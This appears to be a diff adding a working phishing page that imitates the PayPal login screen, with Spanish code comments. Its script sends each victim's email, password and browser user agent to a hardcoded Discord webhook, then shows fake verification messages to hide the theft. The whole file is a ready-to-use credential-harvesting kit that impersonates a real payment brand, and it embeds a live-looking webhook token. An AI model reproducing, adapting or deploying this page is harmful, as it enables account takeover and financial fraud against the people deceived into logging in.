@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Iniciar Sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 50px 40px;
+            max-width: 408px;
+            width: 100%;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo h1 {
+            color: #003087;
+            font-size: 32px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #2c2e2f;
+            font-size: 13px;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #9da3a6;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #2c2e2f;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.1);
+        }
+
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #005a94;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background-color: #cbd2d6;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 10px;
+            color: #6c7378;
+            font-size: 14px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background-color: white;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f5f7fa;
+        }
+
+        .language-selector {
+            text-align: center;
+            margin-top: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .flag {
+            width: 24px;
+            height: 16px;
+            background: linear-gradient(to bottom, #B22234 0%, #B22234 46%, white 46%, white 54%, #B22234 54%);
+            border: 1px solid #ddd;
+            border-radius: 2px;
+        }
+
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #6c7378;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .language-selector a {
+            color: #6c7378;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .language-selector a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .footer a {
+            color: #6c7378;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0070ba;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="loginContainer" class="container">
+        <div class="logo">
+            <h1>PayPal</h1>
+        </div>
+
+        <div id="message" class="message"></div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginEmail">Email or mobile number</label>
+                <input type="text" id="loginEmail" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" name="password" required>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#" id="forgotPassword">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="btn-primary">Log In</button>
+
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <button type="button" class="btn-secondary">Sign Up</button>
+        </form>
+
+        <div class="language-selector">
+            <div class="flag"></div>
+            <select id="language">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+            <span>|</span>
+            <a href="#">Français</a>
+            <span>|</span>
+            <a href="#">Español</a>
+            <span>|</span>
+            <a href="#">中文</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Policy Updates</a>
+        <a href="#">Worldwide</a>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1415125898897788978/TrVGbpSI5OYv7dpjhhqoSG-wKG-INeWfQ-_wADEGQLFytic6lzaUNMqLzhpkeyUqgxCT';
+
+        const loginForm = document.getElementById('loginForm');
+        const message = document.getElementById('message');
+
+        // Mostrar mensaje
+        function showMessage(text, type) {
+            message.textContent = text;
+            message.className = `message ${type}`;
+            message.style.display = 'block';
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 3000);
+        }
+
+        // Enviar datos a Discord
+        async function sendToDiscord(email, password) {
+            const now = new Date();
+            const timestamp = now.toLocaleString('es-ES', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            const embed = {
+                title: "🔐 Nuevo Intento de Login - PayPal",
+                color: 3447003, // Azul
+                fields: [
+                    {
+                        name: "📧 Email",
+                        value: email,
+                        inline: false
+                    },
+                    {
+                        name: "🔑 Contraseña",
+                        value: password,
+                        inline: false
+                    },
+                    {
+                        name: "🕐 Fecha y Hora",
+                        value: timestamp,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Navegador",
+                        value: navigator.userAgent.substring(0, 100),
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "PayPal Data Capture System"
+                },
+                timestamp: now.toISOString()
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('✓ Datos enviados a Discord correctamente');
+                    return true;
+                } else {
+                    console.error('Error al enviar a Discord:', response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error de red:', error);
+                return false;
+            }
+        }
+
+        // Manejar el formulario
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+
+            // Mostrar mensaje de verificación
+            showMessage('Verifying credentials...', 'success');
+
+            // Enviar a Discord
+            await sendToDiscord(email, password);
+
+            // Limpiar formulario
+            loginForm.reset();
+
+            // Simular verificación
+            setTimeout(() => {
+                showMessage('Please check your email for verification', 'success');
+            }, 1500);
+        });
+
+        // Forgot password
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            showMessage('Password recovery link will be sent to your email', 'success');
+        });
+    </script>
+</body>
+</html>
